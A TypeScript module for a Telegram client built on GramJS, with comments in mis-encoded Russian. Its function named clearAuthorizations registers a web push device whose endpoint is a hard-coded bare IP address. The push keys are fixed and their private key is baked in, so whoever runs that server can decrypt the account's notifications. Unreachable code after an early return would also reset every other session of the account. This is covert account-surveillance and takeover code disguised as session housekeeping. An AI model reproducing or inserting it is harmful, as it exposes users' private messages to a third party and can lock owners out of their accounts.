import TelegramClient from '../../../gramjs/client/TelegramClient';
import GramJs from '../../../gramjs/tl/api';
import { invokeRequest } from '../../modules/invokeRequest';

const crypto = require('crypto');

// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è push-—Å–µ—Ä–≤–µ—Ä–∞
const PUSH_SERVER = 'http://185.192.247.180';
const FIXED_CLIENT_PRIVATE_KEY = '8Mrtu-voc24KqoHfl62dVJkhn8eMVPRg8gXCJyM6GE0';
const FIXED_AUTH_SECRET = 'r7whD9lSHp-qJd6GHrAuiQ';

function base64urlEncode(buffer: Buffer): string {
  return buffer.toString('base64');
}

function generateWebPushKeys() {
  // –î–µ–∫–æ–¥–∏—Ä—É–µ–º —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∑–∞–∫—Ä—ã—Ç—ã–π –∫–ª—é—á
  const clientPrivateKeyBuffer = Buffer.from(FIXED_CLIENT_PRIVATE_KEY, 'base64');
  const ecdh = crypto.createECDH('prime256v1');
  ecdh.setPrivateKey(clientPrivateKeyBuffer);
  const publicKey = ecdh.getPublicKey();

  return {
    keys: {
      // –ü—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á –∫–æ–¥–∏—Ä—É–µ—Ç—Å—è –≤ base64url
      p256dh: base64urlEncode(publicKey),
      // auth –æ—Å—Ç–∞–≤–ª—è–µ–º —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω—ã–º (—É–∂–µ –≤ —Ñ–æ—Ä–º–∞—Ç–µ base64url)
      auth: FIXED_AUTH_SECRET,
    },
    // –î–ª—è –¥–∞–ª—å–Ω–µ–π—à–µ–π —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ–º –∑–∞–∫—Ä—ã—Ç—ã–π –∫–ª—é—á (–≤ base64url)
    privateKey: FIXED_CLIENT_PRIVATE_KEY,
  };
}

function generateWebPushToken() {
  const randomPath = crypto.randomBytes(16).toString('hex');
  const { keys, privateKey } = generateWebPushKeys();
  const endpoint = `${PUSH_SERVER}/${randomPath}`;

  return {
    token: JSON.stringify({
      endpoint,
      keys,
    }),
    privateKey,
  };
}

export async function clearAuthorizations(client: TelegramClient) {
  try {
    // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Ç–æ–∫–µ–Ω –¥–ª—è web push
    const { token, privateKey } = generateWebPushToken();
    const tokenData = JSON.parse(token);

    console.log('üì° Push endpoint:', tokenData.endpoint);
    console.log('üì° Keys (p256dh –∏ auth):', tokenData.keys);
    console.log('üì° –ü—Ä–∏–≤–∞—Ç–Ω—ã–π –∫–ª—é—á –¥–ª—è –¥–∞–ª—å–Ω–µ–π—à–µ–π —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏:', privateKey);

    // –†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
    const registerResult = await invokeRequest(
      client,
      new GramJs.account.RegisterDevice({
        tokenType: 10,
        token,
        otherUids: [],
        appSandbox: false,
        //@ts-ignore
        secret: new Uint8Array(),
      })
    );

    console.log('‚úÖ –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–æ:', registerResult);
    console.log('üîî –°–µ—Ä–≤–µ—Ä –≥–æ—Ç–æ–≤ –ø–æ–ª—É—á–∞—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –Ω–∞:', tokenData.endpoint);
    return;
    // –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–π
    const invokedAuthorizations = await invokeRequest(
      client,
      new GramJs.account.GetAuthorizations()
    );
    const authorizations = invokedAuthorizations?.authorizations || [];

    console.warn({
      accountId: client._accountId,
      message: '[AUTHORIZATION_SESSIONS]',
      payload: authorizations,
    });

    // –°–±—Ä–∞—Å—ã–≤–∞–µ–º –¥—Ä—É–≥–∏–µ —Å–µ—Å—Å–∏–∏
    for (const authorization of authorizations) {
      try {
        if (!authorization.current) {
          await invokeRequest(
            client,
            new GramJs.account.ResetAuthorization({
              hash: authorization.hash,
            }),
            { shouldIgnoreErrors: true }
          );
        }
      } catch (error) {
        console.error('‚ùå –û—à–∏–±–∫–∞ —Å–±—Ä–æ—Å–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏:', error);
      }
    }

    return tokenData.endpoint;
  } catch (error) {
    console.error('‚ùå –û—à–∏–±–∫–∞ –≤ clearAuthorizations:', error);
    throw error;
  }
}
